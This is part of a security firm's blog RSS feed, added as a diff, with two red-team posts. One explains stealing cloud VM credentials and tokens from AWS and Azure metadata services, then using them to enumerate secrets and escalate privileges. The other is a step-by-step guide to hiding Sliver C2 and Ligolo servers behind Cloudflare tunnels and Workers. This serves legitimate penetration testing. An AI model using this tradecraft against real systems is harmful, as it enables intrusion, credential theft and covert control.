+    &lt;a href=&#34;#figure-2-bash-script-for-gaining-access-to-imdsv2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Towards the end we can see it requests the ‘credentials’ (think access keys) of the EC2 instance.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image4&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 3: EC2 Security Credentials requested&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-3-ec2-security-credentials-requested&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#figure-3-ec2-security-credentials-requested&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;We can then run the script and receive back a plethora of useful information, including the keys and tokens the VM uses. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image5&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 4: Metadata of EC2 instance collected, with EC2 Security Credentials at the bottom.&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Azure&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#azure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In Azure, this looks similar. Firstly, we generate a generic request asking for information about the VM with the ‘Metadata:true’ HTTP header. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image3&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 5: Metadata being returned from Azure Metadata Service endpoint&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;As the metadata service is returning information correctly we can request our session token of the managed identity assigned to the VM.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image7&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 6: Session token returned for the VM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-6-session-token-returned-for-the-vm&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#figure-6-session-token-returned-for-the-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;If you are working with an app ‘service’ as opposed to a VM the process is slightly different but still very much possible. In this case you should follow &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-app-service&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Now, we have these session tokens, so what? You may be thinking that we already had remote code execution on the virtual machine to get to this point so why do we care about the session token? Whilst you may try many of the same attack paths that you could with an on-premise application through this RCE, you now also have another angle of attack. With these session tokens you are able to ‘login’ to the cloud environment (usually without MFA as these are intended to be used by your non-human service accounts). From here, your attack vectors are far more extensive than in most traditional setups. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image9&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 7: Authenticating to the cloud environment as the compromised Azure VM. &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;For example, having authenticated to the cloud environment you now have an &lt;em&gt;incredibly&lt;/em&gt; rich API at your disposal to begin looking for further vulnerabilities. This could include simply running  ‘&lt;em&gt;Get-AzResource&lt;/em&gt;’ within Azure, which will reveal all resources that you (as the application) have access to. In the screenshot below we can see that in this case this was access to a KeyVault with app secrets within! &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image6&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 8: The compromised application has access to a KeyVault&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-8-the-compromised-application-has-access-to-a-keyvault&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#figure-8-the-compromised-application-has-access-to-a-keyvault&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Thanks for making that so nice and easy. No searching through config files to find SQL databases and connection strings, then manually crafting individual SQL queries to begin exploitation. Here, we have simply run a single API command and then can run a second to dump all the information that we have. This is just one example of several thousand that you have available to you once you authenticate with common cloud API tooling.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;But wait there&amp;rsquo;s more…now that we have the session token for the application we can begin using any number of enumeration, post-exploitation or privilege escalation tools that we want from the perspective of the application. No need to install tooling on the device and trip off those pesky EDR’s, we can simply fire up our preferred tooling (think Azurehound, GraphRunner, bf-aws-permissions, etc.) and load in your session token. Of course, this introduces different OPSEC concerns, but bypassing those detections is something we will discuss later this year (hopefully at a conf!).&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Cloud Permissions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-permissions&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cloud-permissions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now let’s rub salt in the wound. We’ve used our compromise to hit the metadata service and load up our favourite tooling with a session token. Access should be strictly limited, like it was on-premise right? Whilst this is true in theory, understanding and implementing fine-grained access controls and restrictions is a tall order in the modern world of highly complex cloud environments. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;I would like to call out here how many hundreds of IAM roles there are in most cloud environments, many of them with similar yet opposing permissions. Take a &lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;look&lt;/a&gt; at just the built-in Azure roles (not to mention any custom ones implemented to fill gaps) which already totals more than 130 options. You can see how reading each of these and understanding the nuanced permissions they have can be taxing, and goes some way to explaining why we so regularly see overly permissive accounts. We often see permissions being used without the full knowledge of what subsets of those permissions can introduce. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;To provide a very oversimplified example, we regularly see Global Administrator accounts being very well restricted and kept under lock and key. However, some lesser known roles like ‘Privileged Role Administrator’ and ‘Privileged Authentication Administrator’ both allow a threat actor to escalate privileges to Global Administrator through resetting passwords or assigning roles to attacker-controlled accounts. These permissions may have been assigned more liberally, and compromise of them may not trip off as many alerts. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Ultimately, what I am trying to get at here is that when you combine the complexities of modern cloud environments (which we believe to be largely less well understood than on-prem) with the ability to run a plethora of tooling to identify any misconfigurations or overly permissive accounts (including the application you have compromised!) you often introduce far greater security concerns than you might traditionally do on-premise. Don’t believe me? Read &lt;a href=&#34;https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; great deep dive into the Microsoft breach which took place at the start of 2024 in which Microsoft themselves had inadvertently given a legacy app service permissions akin to Global Administrator…&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;The above also introduces an entirely new attack vector within Azure, of applications (service principals) that you compromise potentially having elevated permissions in &lt;em&gt;other&lt;/em&gt; cloud environments beyond just the tenant you are in…but that is a topic for another day.&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Serverless Functions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;serverless-functions&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#serverless-functions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A final point is that with the rise of serverless architecture (AWS Lambda, Azure Functions, etc.) we are starting to get our hands on these more often. Crucially, these can still be thought of as cloud-hosted web applications, and may be vulnerable to the same risks mentioned above depending on the implementation. For example, a member of our red team recently found a way to package and exfiltrate data over DNS from an AWS Lambda that had DENY ALL on all TCP and UDP ports to all ranges. For a write up on that check out &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; recent labs article. The key point here is that whilst they might not look and feel like traditional web apps, these serverless functions present the same risk to an organisation as a web app and can be used to progress attack paths just as well. &lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In conclusion, I am not suggesting that up until this point AppSec has not been of paramount importance. However, when looking at the arguments presented and the work we’ve been conducting as a team over the last year I feel that the migration to cloud might present yet another watershed moment in AppSec’s journey. Perhaps it will take a notable organisation to be breached via a cloud-hosted application entry point for this point to become salient, but in my eyes it is a matter of when, not if. Thanks for reading and I hope my internal monologue on the topic was of interest!&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Putting the C2 in C2loudflare</title>
+      <link>//localhost:1313/articles/2024/06/2024-06-28-putting-the-c2-in-c2loudflare/</link>
+      <pubDate>Fri, 28 Jun 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/06/2024-06-28-putting-the-c2-in-c2loudflare/</guid>
+      <description>
+        
+        
+        &lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt; How to bring up an entire C2 infrastructure with all your tooling and their corresponding redirectors within 5 minutes with the help of Azure Snapshots, Cloudflare and Tmux Resurrect.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Every so often I seem to stumble across various ideas, that when combined, massively improve my overall productivity at work. Most of these ideas on their own are nothing new, but when used in tandem can really accelerate your productivity, which is what I wanted to illustrate in today&amp;rsquo;s post. A great example of this is combining Cloudflare workers, apps and tunnels along with Azure VM snapshots and Tmux Resurrect to allow you to bring up an entire C2 infrastructure in 5 mins from a single VM.&lt;/p&gt;
+&lt;p&gt;Here at JUMPSEC we have now moved from a system where we would need to allocate project time for infrastructure setup, to it only being something we need to allocate 5 minutes to on day 1 of the test in some cases. Just to help you understand the efficiencies that can be gained with this setup, and how it is worth your investment to continue reading, here is our typical “Day 1” infrastructure setup workflow utilising both Azure and Cloudflare:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create a Disk in Azure from our saved ‘Template’ snapshot (2 mins)&lt;/li&gt;
+&lt;li&gt;Create a VM from that Disk (2 mins)&lt;/li&gt;
+&lt;li&gt;Log into the VM and using the &lt;a href=&#34;https://github.com/tmux-plugins/tmux-resurrect&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tmux-resurrect&lt;/a&gt; plugin all of our servers can be brought up at a keystroke (1 min)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;That’s it, 5 mins of your time. Our previously saved snapshot is a VM saved in time with no client data but containing all of our tools including multiple C2 servers, Ligolo server, http server, Tmux Resurrect, prebuilt payloads for that redirector url and, of course, the Cloudflare connectivity we will focus on in this blog.&lt;/p&gt;
+&lt;p&gt;In regards to Tmux Resurrect, think of it as a tool where if you have 6 command prompt panes open in a single tmux session, each with their own C2 server or Cloudflare connectivity command running, that it allows you to save that view. The next time you start tmux and issue the ‘Ctrl-r’ command it ‘resurrects’ that view so it will kick off all the commands that were running previously when you saved them, therefore starting all of your servers instantly. This can be a great time saver.&lt;/p&gt;
+&lt;p&gt;Creating snapshots, disks and VM’s from those disks is also super easy following the guidance &lt;a href=&#34;https://dev.to/icebeam7/cloning-azure-vms-1889&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;. After you are happy that the template VM has all of your servers operating correctly, with Tmux Resurrect configured to start them, you can just snapshot it. Obviously you can then have multiple snapshot templates connecting to different Cloudflare redirectors to scale this up amongst your team so testers aren’t all using the same Cloudflare Worker.&lt;/p&gt;
+&lt;p&gt;From here on in we will focus on the Cloudflare configuration side of things as that is the trickier aspect and the main point of this post. Given this process is meant to simplify life, this post will be more screenshot heavy than textual but I think that’s what people prefer (or at least I hope) in regards to this type of post. What we are fundamentally trying to achieve can be seen in this diagram below, where we can point our tooling whether it be Ligolo, C2 agent or file requests at a single redirector hostname where a Cloudflare Worker will consume the request and redirect it to the desired location on our Cloud VM.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image9&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Anyway, let’s make a start.&lt;/p&gt;
+&lt;p&gt;To begin with, it is worth noting two points. Firstly, the naming conventions used for headers, domains, tunnel names, etc. are all for illustrative purposes so we have made them as obvious as possible, but do adjust them to suit your own needs.&lt;/p&gt;
+&lt;p&gt;Secondly I am taking it for granted that creating a VM in Azure or AWS and being able to SSH into it as well as buying a domain from Cloudflare or transferring one to Cloudflare is something that our readers can manage. Therefore, I will focus on explaining the remainder of the infrastructure in the diagram.&lt;/p&gt;
+&lt;p&gt;Except for buying a domain name, the cost of the Cloudflare setup is entirely cost free which is an amazing facility to have although you will need to register a credit card on your account. It’s also worth noting that a lot of this setup is one-time only, so if it looks like a scary amount of config, rest reassured at this point that the majority of it is a one-off.&lt;/p&gt;
+&lt;p&gt;First things first, you will need to set up a Cloudflare account, so go on over to Cloudflare.com and register an account. If you bought your domain from them or have recently transferred it to them, you will see your domain listed under ‘Websites’ as shown. Please note the highlighted ‘Zero Trust’ area too because that is where we will head to next.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image11&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;On clicking your domain, you will have visibility of an important piece of information which is your ‘Account ID’. Please note this down as this will be required further on.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image10&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Now follow the previously highlighted link to the ‘Zero Trust’ area of Cloudflare which is where we will add our various tunnels from the outside world into our cloud virtual machine.&lt;/p&gt;
+&lt;p&gt;On entering the ‘Zero Trust’ section choose ‘Networks’ followed by ‘Tunnels’ and click ‘Create a tunnel’ which will create an area where you can create multiple tunnels within it.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image13&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;At this point you will be asked to create your first tunnel or “Public hostname”. Pictured below are some of the ones we use (which are redacted) but just to give you an idea the first ‘Public hostname’ could be &lt;a href=&#34;https://sliver.yourdomain.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://sliver.yourDomain.com&lt;/a&gt; and any Sliver C2 data hitting that endpoint would then be routed through that particular tunnel into the VM where ‘cloudflared’ is running and it will be redirected to the Sliver listener at https://127.0.0.1:443.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image12&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Just one thing to point out, when you see the number 1 under ‘Origin configurations’ it is just highlighting that some additional config is in place and for the https tunnels that was simply just toggling ‘No TLS Verify’ to ‘Enabled’ to ensure that the data bypasses any TLS checks:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image15.png&#34; title=&#34;image15&#34; alt=&#34;image15&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image15&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Now in the ‘Overview’ area of your Cloudflare tunnels you will be provided with some code that needs to be run on your Cloud VM which will start the tunnels calling out to Cloudflare to allow traffic to traverse them. This includes your very long private token. So, click your OS of choice and using their instructions install the Cloudflare tunnel software which they call ‘cloudflared’ on your VM.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image14.png&#34; title=&#34;image14&#34; alt=&#34;image14&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image14&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;To then start the tunnels on your VM you run this command:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cloudflared tunnel run --token YourTokenHere&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Right, just taking us back to our overview diagram to view our progress, we have now completed the area in red, so we are halfway there. Good job.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image17.png&#34; title=&#34;image17&#34; alt=&#34;image17&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image17&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;As it stands you can now send data into your tunnels quite easily, the problem is, that so can anyone else. As covert red teams that is not a good look, so we need to add some protection to the tunnels. This is where the workhorse of the setup comes into play via the Cloudflare worker.&lt;/p&gt;
+&lt;p&gt;The Cloudflare worker comes with its own Cloudflare URL, normally something like customworkername.customsubdomain.workers.dev but it can also be a domain of your choosing. We have kept it as the well-known Cloudflare workers.dev prefix for demonstration purposes. The worker is essentially serverless code, which is constantly receiving requests and, in our case, redirecting those requests to where we want them to go.&lt;/p&gt;
+&lt;p&gt;To create our worker some tools are required, and some code needs to be deployed but this doesn’t necessarily need to be carried out on your cloud VM and can be carried out from your local Linux system that has access to your Cloudflare account.&lt;/p&gt;
+&lt;p&gt;Firstly, if you don’t have it installed, install the npm package like so which provides access to the npx command:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;sudo apt install npm&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Following this, checkout out the demo Cloudflare worker we have provided on our Github repo that will contain a ‘src’ folder which has an index.js file (which is the code the Worker uses to run) and it will also contain a wrangler.toml file which contains the variables the Worker references:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/CloudflareRedirector&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/CloudflareRedirector&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Now cd into the ‘CloudflareRedirector folder and run this command to install the wrangler files required to deploy the worker to Cloudflare.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;npm install wrangler --save-dev&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;A folder named node_modules and a file named package.json will also be created within our folder but we don’t need to be concerned with those.&lt;/p&gt;
+&lt;p&gt;Next, we need to authenticate to the Cloudflare account we set up previously so issue this command and log into Cloudflare:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;npx wrangler login&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Finally open the wrangler.toml file in your text editor of choice and edit the fields outlined in red below including your accountid that we found at the beginning of this post. The URLs should match the tunnel URLs you have previously set up. The worker endpoint, customip, service variables, etc. can be readjusted after it has been deployed so you can leave them as-is.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The wrangler.toml file that provides variables to be used by the Cloudflare worker can be seen here. As mentioned the verbose subdomains and headers are used for demo purposes so adjust accordingly.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image16.png&#34; title=&#34;image16&#34; alt=&#34;image16&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image16&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;With all of this data populated we can now deploy the Worker to Cloudflare with:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;npx wrangler deploy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now when we go back to Cloudflare and go to the &amp;lsquo;Workers &amp;amp; Pages&amp;rsquo; section we should see our new Worker named ‘redirector’ as shown:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image20.png&#34; title=&#34;image20&#34; alt=&#34;image20&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image20&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;When you go to the ‘Settings’ tab of the worker and view the variables you can see whatever data you have just deployed across to Cloudflare. You can edit these in the gui as shown, although another deployment will overwrite these, so if many deployments are expected you are better off making the changes in the wrangler.toml file and redeploying.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image18.png&#34; title=&#34;image18&#34; alt=&#34;image18&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image18&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;You can also click ‘Edit Code’ which will display the code used by the worker which is essentially the index.js file from the src folder we checked out from the repo. Below is just a snippet of the beginning of that file:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image19.png&#34; title=&#34;image19&#34; alt=&#34;image19&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image19&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;At this point it’s probably worth taking some time to explain how the worker code that we deployed operates. Essentially, we specify some constants at the beginning which we will use to look for header data within the incoming http requests. We also specify our custom constants to store the values we manually entered via our wrangler.toml such as SLIVER_HEADER which had the value MY-SLIVER.&lt;/p&gt;
+&lt;p&gt;Now when a request comes in, the worker checks via multiple ‘if’ statements if the incoming header value is equal to for example the ‘SLIVER_HEADER_’_ text of ‘MY-SLIVER_’._ If it matches, we create a new request and send it to the sliverUrl which is linked to our custom SLIVERENDPOINT which should be linked to the URL of the Sliver tunnel.&lt;/p&gt;
+&lt;p&gt;The code continues on like this with other ‘if’ checks, such as this one below redirecting our requests to our file server. In the scenario that the http request doesn’t have a custom header that we are expecting the code then checks if the IP is an IP we may want to allow into our internal file server. We then redirect that to a tunnel which points to our internal http server. This IP can be set under CUSTOM_IP in the wrangler.toml or via the Cloudflare website.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image4&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;So, in our case we may have a custom header for multiple C2’s running on our VM or a Ligolo server. Keep in mind though, to use Ligolo over Cloudflare websockets you will need this fork of ligolo-ng:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/virusvfv/ligolo-ng/tree/Websockets&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/virusvfv/ligolo-ng/tree/Websockets&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Anyhow, you may also have noticed that two new header values (‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’) are also added to the new request via the code but I will come to that in a moment.&lt;/p&gt;
+&lt;p&gt;Now that your worker is deployed you can view its URL in the ‘Triggers’ area of the Worker’s ‘Settings’ area as shown below. Here you can set a custom domain or take the one provided by Cloudflare.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image21.png&#34; title=&#34;image21&#34; alt=&#34;image21&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image21&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;When you have decided which URL to use please go back and edit the variable ‘WORKER_ENDPOINT’ in your wrangler.toml and redeploy it or via the Cloudflare gui which will automatically redeploy the worker.&lt;/p&gt;
+&lt;p&gt;It’s also worth pointing out the logging features of the redirector should there be any issues with the requests coming in. You can click ‘Begin log stream’ under ‘Logs’ which will allow you to see all the requests entering the worker. There is also logging on the tunnels should you want to see the requests entering those too. We feel that some of the drawbacks in regards to lack of visibility for debugging that previously existed in regards Cloudflare or other domain fronted setups have now been mitigated with all of these excellent logging capabilities.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image22.png&#34; title=&#34;image22&#34; alt=&#34;image22&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image22&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Just taking another step back, this is how far we have come now with only the final piece of the jigsaw in red left to complete.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image23.png&#34; title=&#34;image23&#34; alt=&#34;image23&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image23&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We now have a Worker that can receive custom http requests and we have tunnels that will take the requests and tunnel them into our Cloud VM infrastructure. The last issue we have is that although we now have a Worker carrying data to our tunnels, the tunnel URLs are still accessible to the outside world so our Worker can be bypassed.&lt;/p&gt;
+&lt;p&gt;To rectify this, we need to add a ‘Zero Trust’ check to the tunnel ‘entrances’, and we do this by placing Cloudflare applications as the entry point to them. These can also have preconditions to entry attached to them called ‘Policies’. This is easier to explain with some further screenshots.&lt;/p&gt;
+&lt;p&gt;We must first create a ‘Service token’ which is used by automated systems like Workers to authenticate against our zero trust policies. In the Cloudflare zero trust area we go to ‘Access’ then ‘Service Auth’ and click ‘Create Service Token’ and provide a name and duration.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image24.png&#34; title=&#34;image24&#34; alt=&#34;image24&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image24&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
